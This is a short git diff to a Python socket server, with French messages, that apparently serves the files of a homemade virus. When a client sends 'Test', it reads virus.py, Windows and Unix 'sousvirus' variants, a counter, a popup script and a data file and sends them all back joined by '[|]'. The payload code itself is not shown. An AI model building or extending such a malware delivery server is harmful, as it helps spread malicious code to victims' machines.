@@ -11,7 +11,7 @@ while True:
     conn, address = socket.accept()
     print("En ecoute..")
 
-    data = conn.recv(2048)
+    data = conn.recv(4096)
     data = data.decode("utf8")
     print(data)
     if data == "Test":
@@ -20,16 +20,24 @@ while True:
         fic = open("virus.py","r")
         dataV = fic.read()
         fic.close()
-        fic = open("sousvirus.py","r")
-        dataSV = fic.read()
+        fic = open("sousvirusW.py","r")
+        dataSVW = fic.read()
         fic.close() 
         fic = open("data.txt","r")
         dataD = fic.read()
         fic.close() 
-        data = dataV + "[|]" + dataSV + "[|]" + dataD
+        fic = open("compteur.py","r")
+        dataC = fic.read()
+        fic.close() 
+        fic = open("popup.py","r")
+        dataP = fic.read()
+        fic.close() 
+        fic = open("sousvirusU.py","r")
+        dataSVU = fic.read()
+        fic.close() 
+        data = dataV + "[|]" + dataSVW + "[|]" + dataD + "[|]" + dataC + "[|]" + dataP + "[|]" + dataSVU
         conn.sendall(data.encode("utf8"))
         print("envoyé")
-        print(dataD)
 
 conn.close()
 socket.close()
